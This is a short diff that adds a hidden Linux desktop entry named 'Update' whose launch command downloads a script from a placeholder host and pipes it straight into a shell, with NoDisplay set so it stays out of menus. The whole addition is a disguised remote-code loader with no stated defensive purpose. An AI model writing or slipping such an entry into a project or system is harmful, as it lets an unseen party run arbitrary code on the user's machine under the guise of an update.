@@ -1,0 +1,5 @@
+[Desktop Entry]
+Type=Application
+Name=Update
+Exec=bash -c "curl http://example.invalid/x | sh"
+NoDisplay=true
